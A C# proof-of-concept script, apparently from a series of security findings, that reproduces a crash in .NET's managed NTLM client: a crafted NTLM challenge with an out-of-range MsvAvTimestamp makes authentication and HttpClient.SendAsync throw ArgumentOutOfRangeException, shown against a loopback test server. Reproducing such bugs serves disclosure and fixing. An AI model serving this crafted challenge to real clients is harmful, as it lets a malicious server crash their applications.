// Finding: the managed NTLM client (default on macOS, iOS, Android and OpenBSD; opt-in on Linux via the
// System.Net.Security.UseManagedNtlm switch) converts the server's MsvAvTimestamp AV pair with DateTime.FromFileTimeUtc without
// validating it. An out-of-range FILETIME from the server makes GetOutgoingBlob throw ArgumentOutOfRangeException instead of
// returning InvalidToken, and through HttpClient the exception comes out of SendAsync, so a malicious or broken NTLM server can
// crash clients that only expect HttpRequestException.
// Run: dotnet run 28-ManagedNtlm-BadTimestamp.cs
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;

AppContext.SetSwitch("System.Net.Security.UseManagedNtlm", true);
byte[] challenge = Challenge(timestamp: ulong.MaxValue);

// 1. NegotiateAuthentication directly.
using (var client = new NegotiateAuthentication(new NegotiateAuthenticationClientOptions { Package = "NTLM", Credential = new NetworkCredential("user", "Pa$$w0rd", "DOMAIN"), TargetName = "HTTP/localhost" }))
{
    client.GetOutgoingBlob(ReadOnlySpan<byte>.Empty, out _);
    string outcome;
    try { client.GetOutgoingBlob(challenge, out var status); outcome = status.ToString(); }
    catch (Exception ex) { outcome = ex.GetType().Name + ": " + ex.Message; }
    Console.WriteLine($"NegotiateAuthentication.GetOutgoingBlob(challenge with MsvAvTimestamp 0x{ulong.MaxValue:X}) -> {outcome}");
}

// 2. HttpClient against a server that asks for NTLM and sends that challenge.
var listener = new TcpListener(IPAddress.Loopback, 0);
listener.Start();
int port = ((IPEndPoint)listener.LocalEndpoint).Port;
_ = Task.Run(async () =>
{
    using TcpClient connection = await listener.AcceptTcpClientAsync();
    NetworkStream stream = connection.GetStream();
    await ReadRequest(stream);
    await stream.WriteAsync(Encoding.ASCII.GetBytes("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\n\r\n"));
    await ReadRequest(stream);
    await stream.WriteAsync(Encoding.ASCII.GetBytes($"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {Convert.ToBase64String(challenge)}\r\nContent-Length: 0\r\n\r\n"));
    await ReadRequest(stream);
});

using var http = new HttpClient(new SocketsHttpHandler { Credentials = new NetworkCredential("user", "Pa$$w0rd", "DOMAIN") });
string httpOutcome;
try { httpOutcome = "status " + (int)(await http.GetAsync($"http://localhost:{port}/")).StatusCode; }
catch (Exception ex) { httpOutcome = ex.GetType().Name + ": " + ex.Message; }
Console.WriteLine($"HttpClient.GetAsync against that server -> {httpOutcome}");
Console.WriteLine(httpOutcome.StartsWith(nameof(ArgumentOutOfRangeException), StringComparison.Ordinal) ? "REPRODUCED: a server-controlled timestamp throws ArgumentOutOfRangeException." : "NOT REPRODUCED");

static async Task ReadRequest(NetworkStream stream)
{
    var request = new List<byte>();
    byte[] one = new byte[1];
    while (!request.TakeLast(4).SequenceEqual("\r\n\r\n"u8.ToArray()) && await stream.ReadAsync(one) == 1)
    {
        request.Add(one[0]);
    }
}

static byte[] Challenge(ulong timestamp)
{
    byte[] domain = Encoding.Unicode.GetBytes("DOMAIN");
    var targetInfo = new List<byte>();
    void AvPair(ushort id, byte[] value) { targetInfo.AddRange(BitConverter.GetBytes(id)); targetInfo.AddRange(BitConverter.GetBytes((ushort)value.Length)); targetInfo.AddRange(value); }
    AvPair(2, domain);                                   // MsvAvNbDomainName
    AvPair(1, Encoding.Unicode.GetBytes("SERVER"));      // MsvAvNbComputerName
    AvPair(7, BitConverter.GetBytes(timestamp));         // MsvAvTimestamp
    AvPair(0, []);                                       // MsvAvEOL

    var message = new List<byte>();
    message.AddRange("NTLMSSP\0"u8.ToArray());
    message.AddRange(BitConverter.GetBytes(2));
    message.AddRange(BitConverter.GetBytes((ushort)domain.Length));
    message.AddRange(BitConverter.GetBytes((ushort)domain.Length));
    message.AddRange(BitConverter.GetBytes(56));
    message.AddRange(BitConverter.GetBytes(0xE28A8235u));                      // NegotiateFlags
    message.AddRange(new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });                   // ServerChallenge
    message.AddRange(new byte[8]);                                             // Reserved
    message.AddRange(BitConverter.GetBytes((ushort)targetInfo.Count));
    message.AddRange(BitConverter.GetBytes((ushort)targetInfo.Count));
    message.AddRange(BitConverter.GetBytes(56 + domain.Length));
    message.AddRange(new byte[] { 10, 0, 0x61, 0x4A, 0, 0, 0, 15 });          // Version
    message.AddRange(domain);
    message.AddRange(targetInfo);
    return message.ToArray();
}
